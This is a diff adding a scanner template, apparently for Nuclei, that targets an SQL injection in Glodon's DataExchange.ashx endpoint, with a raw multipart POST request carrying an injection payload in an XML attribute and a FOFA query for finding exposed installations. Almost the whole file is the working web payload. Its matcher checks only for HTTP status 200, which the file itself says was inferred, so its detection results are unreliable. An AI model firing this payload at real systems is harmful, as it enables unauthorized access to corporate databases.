@@ -1,0 +1,51 @@
+id: poc-eiltoxpua8fh9c7u
+info:
+  name: 广联达-DataExchange-Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eiltoxpua8fh9c7u
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eiltoxpua8fh9c7u
+    fofa: app="Glodon-企业管理产品"
+http:
+- raw:
+  - 'POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent:Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+
+    Content-Type: multipart/form-data; boundary=12ef5586849044debc33731d4c32afd0
+
+    Content-Length: 287
+
+
+    --12ef5586849044debc33731d4c32afd0
+
+    Content-Disposition: form-data; name="SystemName"
+
+
+    BIM
+
+    --12ef5586849044debc33731d4c32afd0
+
+    Content-Disposition: form-data; name="Params"
+
+
+    <rootElement dir="1'' and 1=user and ''Hami''=''Hami">
+
+    </rootElement>
+
+    --12ef5586849044debc33731d4c32afd0--
+
+
+    状态码200包含内容GB.LK.Document.WebSite'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
